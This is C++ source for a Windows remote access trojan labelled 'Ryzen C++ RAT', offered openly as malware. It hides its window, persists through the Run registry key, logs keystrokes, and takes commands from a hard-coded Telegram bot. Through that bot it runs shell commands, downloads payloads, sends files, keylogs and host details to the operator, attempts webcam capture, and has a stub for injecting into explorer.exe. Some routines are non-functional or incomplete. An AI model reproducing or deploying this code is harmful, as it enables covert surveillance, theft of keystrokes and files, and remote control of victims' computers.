#include <windows.h>
#include <wininet.h>
#include <string>
#include <vector>
#include <sstream>
#include <tlhelp32.h>
#include <fstream>
#pragma comment(lib, "wininet.lib")
#pragma comment(lib, "user32.lib")
#pragma comment(lib, "ws2_32.lib")

#define BOT_TOKEN "8905716291:AAGTR1Kz4h4jBKnh4BvfG_977FEFLJl5PSQ"
#define CHAT_ID "519353146"
#define API_URL "https://api.telegram.org/bot" BOT_TOKEN "/"

std::string lastUpdateId = "0";

std::string httpGet(const std::string& url) {
    HINTERNET hSession = InternetOpenA("Mozilla/5.0", INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);
    if (!hSession) return "";
    HINTERNET hConn = InternetOpenUrlA(hSession, url.c_str(), NULL, 0, INTERNET_FLAG_NO_CACHE_WRITE, 0);
    if (!hConn) { InternetCloseHandle(hSession); return ""; }
    std::string result;
    char buffer[4096];
    DWORD bytesRead;
    while (InternetReadFile(hConn, buffer, sizeof(buffer), &bytesRead) && bytesRead) {
        result.append(buffer, bytesRead);
    }
    InternetCloseHandle(hConn);
    InternetCloseHandle(hSession);
    return result;
}

void sendMessage(const std::string& text) {
    std::string url = API_URL "sendMessage?chat_id=" CHAT_ID "&text=";
    url += text;
    httpGet(url);
}

void sendFile(const std::string& path, const std::string& caption = "") {
    std::string cmd = "curl -F document=@\"" + path + "\" \"https://api.telegram.org/bot" BOT_TOKEN "/sendDocument?chat_id=" CHAT_ID "\"";
    system(cmd.c_str());
}

std::string execCmd(const std::string& cmd) {
    char buffer[4096];
    std::string result;
    FILE* pipe = _popen(cmd.c_str(), "r");
    if (!pipe) return "Error";
    while (fgets(buffer, sizeof(buffer), pipe)) result += buffer;
    _pclose(pipe);
    return result.empty() ? "[Done]" : result;
}

bool downloadFile(const std::string& url, const std::string& path) {
    HINTERNET hSession = InternetOpenA("Mozilla/5.0", INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);
    if (!hSession) return false;
    HINTERNET hConn = InternetOpenUrlA(hSession, url.c_str(), NULL, 0, INTERNET_FLAG_NO_CACHE_WRITE, 0);
    if (!hConn) { InternetCloseHandle(hSession); return false; }
    std::ofstream f(path, std::ios::binary);
    char buffer[4096];
    DWORD bytesRead;
    while (InternetReadFile(hConn, buffer, sizeof(buffer), &bytesRead) && bytesRead) {
        f.write(buffer, bytesRead);
    }
    f.close();
    InternetCloseHandle(hConn);
    InternetCloseHandle(hSession);
    return true;
}

void captureWebcam() {
    system("powershell -Command \"Add-Type -AssemblyName System.Windows.Forms; $camera = New-Object System.Windows.Forms.Camera; $camera.Capture('C:\\temp\\cam.jpg')\"");
    if (GetFileAttributesA("C:\\temp\\cam.jpg") != INVALID_FILE_ATTRIBUTES) {
        sendFile("C:\\temp\\cam.jpg", "📸 Webcam");
        DeleteFileA("C:\\temp\\cam.jpg");
    }
}

HHOOK hKeyHook;
std::string keyLog;

LRESULT CALLBACK KeyProc(int nCode, WPARAM wParam, LPARAM lParam) {
    if (nCode >= 0 && (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN)) {
        KBDLLHOOKSTRUCT* p = (KBDLLHOOKSTRUCT*)lParam;
        char key[16] = {0};
        GetKeyNameTextA(p->scanCode << 16, key, 16);
        if (strlen(key) == 0) {
            sprintf_s(key, "[%d]", p->vkCode);
        }
        keyLog += key;
        if (keyLog.length() > 500) {
            std::ofstream f("C:\\temp\\keylog.txt", std::ios::app);
            f << keyLog << std::endl;
            f.close();
            keyLog.clear();
        }
    }
    return CallNextHookEx(hKeyHook, nCode, wParam, lParam);
}

void startKeylogger() {
    hKeyHook = SetWindowsHookExA(WH_KEYBOARD_LL, KeyProc, GetModuleHandleA(NULL), 0);
    MSG msg;
    while (GetMessageA(&msg, NULL, 0, 0)) {
        TranslateMessage(&msg);
        DispatchMessageA(&msg);
    }
}

void injectIntoProcess(const std::string& processName) {
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    PROCESSENTRY32 pe = { sizeof(PROCESSENTRY32) };
    if (Process32First(hSnapshot, &pe)) {
        do {
            if (processName == pe.szExeFile) {
                HANDLE hProc = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pe.th32ProcessID);
                if (hProc) {
                    void* addr = VirtualAllocEx(hProc, NULL, 4096, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
                    CloseHandle(hProc);
                }
                break;
            }
        } while (Process32Next(hSnapshot, &pe));
    }
    CloseHandle(hSnapshot);
}

void setPersistence() {
    char path[MAX_PATH];
    GetModuleFileNameA(NULL, path, MAX_PATH);
    HKEY hKey;
    RegOpenKeyExA(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_SET_VALUE, &hKey);
    RegSetValueExA(hKey, "RyzenHelper", 0, REG_SZ, (BYTE*)path, strlen(path));
    RegCloseKey(hKey);
}

int main() {
    ShowWindow(GetConsoleWindow(), SW_HIDE);
    setPersistence();
    CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)startKeylogger, NULL, 0, NULL);
    sendMessage("[+] Ryzen C++ RAT Activated");

    while (true) {
        std::string url = API_URL "getUpdates?offset=" + lastUpdateId + "&timeout=10";
        std::string resp = httpGet(url);
        if (resp.find("\"text\"") != std::string::npos) {
            size_t p1 = resp.find("\"text\":\"");
            if (p1 != std::string::npos) {
                p1 += 8;
                size_t p2 = resp.find("\"", p1);
                std::string cmd = resp.substr(p1, p2 - p1);
                size_t o1 = resp.find("\"update_id\":");
                if (o1 != std::string::npos) {
                    o1 += 12;
                    size_t o2 = resp.find(",", o1);
                    lastUpdateId = resp.substr(o1, o2 - o1);
                }
                if (cmd.rfind("/cmd ", 0) == 0) {
                    sendMessage(execCmd(cmd.substr(5)));
                }
                else if (cmd.rfind("/dl ", 0) == 0) {
                    if (downloadFile(cmd.substr(4), "C:\\temp\\payload.exe"))
                        sendMessage("[+] Downloaded");
                    else
                        sendMessage("[!] Download failed");
                }
                else if (cmd.rfind("/upload ", 0) == 0) {
                    sendFile(cmd.substr(8));
                    sendMessage("[+] File sent");
                }
                else if (cmd == "/webcam") {
                    captureWebcam();
                }
                else if (cmd == "/keylog") {
                    std::ifstream f("C:\\temp\\keylog.txt");
                    if (f) {
                        std::string content((std::istreambuf_iterator<char>(f)), std::istreambuf_iterator<char>());
                        sendMessage(content.empty() ? "[Empty]" : content);
                        f.close();
                        DeleteFileA("C:\\temp\\keylog.txt");
                    } else {
                        sendMessage("[No log]");
                    }
                }
                else if (cmd == "/info") {
                    std::string info = "Host: " + std::string(getenv("COMPUTERNAME")) +
                                       "\nUser: " + std::string(getenv("USERNAME")) +
                                       "\nIP: " + execCmd("curl -s ifconfig.me");
                    sendMessage(info);
                }
                else if (cmd == "/persist") {
                    setPersistence();
                    sendMessage("[+] Persist");
                }
                else if (cmd == "/inject") {
                    injectIntoProcess("explorer.exe");
                    sendMessage("[+] Injected");
                }
            }
        }
        Sleep(3000);
    }
    return 0;
